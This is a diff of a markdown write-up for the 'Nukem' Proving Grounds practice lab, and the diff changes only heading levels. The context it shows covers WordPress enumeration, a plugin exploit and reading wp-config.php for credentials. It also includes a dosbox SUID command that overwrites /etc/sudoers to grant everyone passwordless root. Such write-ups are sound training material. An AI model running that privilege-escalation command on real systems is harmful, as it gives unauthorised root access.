@@ -1,6 +1,4 @@
-# Nukem Proving Grounds Practice
-
-## Foothold
+# Foothold
 ![c7fca070d76cd13ae4f08a547f99b271.png](:/515a55038fc24fc0be28c580d46a9d9a)
 We can see that the website is running wordpress, lets run an enumeration script using wpscan.
 
@@ -42,7 +40,7 @@ After searching for an exploit for each plugin I found that simple-file-list v1.
 
 ![3d872b71bf52b36582238c75d15158f6.png](:/42c641b101d24c0b925cf42473ef0dfc)
 
-## Getting user
+# Getting user
 
 Reading  ```/srv/http/wp-config.php```
 
@@ -87,7 +85,7 @@ SUID Binaries:
 /usr/bin/unix_chkpwd
 ```
 
-## Privesc:
+# Privesc:
 The way to root on this machine was relatively simple, you overwrite the /etc/sudoers file using a vulnerable SUID bit ```/usr/bin/dosbox```. This SUID's exploit can also be located on GTFOBins.
 ```
 /usr/bin/dosbox -c 'mount c /' -c "echo ALL ALL=(ALL) NOPASSWD: ALL > c:\etc\sudoers" -c exit
